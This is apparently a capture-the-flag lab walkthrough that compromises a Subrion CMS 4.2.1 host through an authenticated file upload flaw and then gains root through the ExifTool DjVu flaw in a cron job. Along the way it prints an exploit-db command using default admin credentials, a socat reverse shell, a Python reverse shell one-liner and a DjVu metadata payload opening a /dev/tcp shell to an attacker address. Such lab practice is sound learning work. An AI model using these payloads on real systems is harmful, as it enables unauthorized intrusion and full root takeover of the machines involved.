
# Introduction

In this lab, the attacker exploits the target through an authenticated file upload bypass vulnerability in Subrion CMS that leads to remote code execution. Then the attacker can exploit a root cron job via a script running exiftool every minute.
# Objective

- Enumerate open services and identify the Subrion CMS instance and its version.
- Gain access to the CMS using default credentials and navigate to the administrative dashboard.
- Exploit the file upload bypass vulnerability to deploy a web shell and establish initial access.
- Craft a malicious DjVu file to exploit the ExifTool vulnerability (CVE-2021-22204).
- Place the payload to trigger the cron job and achieve root access on the target system.

# Information Gathering 

Nmap Scan Results:

==No Ports found==

When visiting the target IP address we are redirected to a link at, "exfiltrated.offsec."

Let's add the IP address to the /etc/hosts file and see if we can get a connection:


	echo 192.168.238.163 exfiltrated.offsec | sudo tee -a /etc/hosts

Once the IP address was added to the hosts file, we are able to access the front page of a "kickstart" web page.

Upon inspection there appears to be a Admin Login page on this site that is powered by Subrion CMS v 4.2.1, we can verify if there are any exploits in Metasploit or SearchSploit.


According to searchsploit there is a remote execution code exploit that is prompted by a file upload on the kickstart dashboard site. We will use this to gain an initial foothold in the system.

# Service Enumeration

To access the admin login portal, we tried some initial social engineering username/password combos and gained access using:

	username: admin
	passwd: admin

*This is a fairly common combination among CTFs*

Moving forward we attempt to run the script using the target IP address with the login parameters for access:

Subrion CMS 4.2.1 - Arbitrary File Upload -> https://www.exploit-db.com/exploits/49876  (CVE: 2018-19422)

	python3 49876.py -u http://exfiltrated.offsec/panel/ -l admin -p admin

Using the above exploit, we were able to gain an initial foothold into the machine!

For a better stabilized shell, we can run the below socat command to output us into a more versatile shell env:

	socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.XXX.XXX:443
# Privilege Escalation

To escalate our privilege on this machine we run through our Linux privilege escalation checklist for known escalation techniques.

Using this technique, we find a cron job running on the remote machine that executes files on the target IP "/panel/uploads" subdomain on their webserver. In the web portal we are able to directly upload files to this page and can therefore attempt to raise our access from there. 

To perform this, we first need to research other attempts of this exploit for better understanding. Luckily, there is a well documented exploit on exploitDB that outlines that correct steps to perform this type of exploitation:

	exploitDB 49881->  https://www.exploit-db.com/docs/49881

The requirements for this script are as follow:

1) shell.sh - shell script to call a reverse shell
2) DjVu payload supported by the DjVu package in python
		To install the library please visit this link -> https://pypi.org/project/djvulibre-python/
3) exploit.jpg file to upload to the target IP with code to create a reverse shell


First we create the shell.sh file with a python reverse shell script:

	touch shell.sh
	vim shell.sh
	Text: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.XXX.XXX",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'


Second, with the DjVu library already installed, we create the malicious payload in the exploit.jpg file:

	(metadata "\c${system('bash -c \"bash -i >& /dev/tcp/192.168.XXX.XXX/80 0>&1\"')};")

Lastly, we upload the file directly to the web server /upload page and let the cron job run the script.

After a minute of waiting, the cron job executes successfully and we now have a root shell.

We have successfully solved the machine! The two required flags can be found in machine directories after some light detective work. 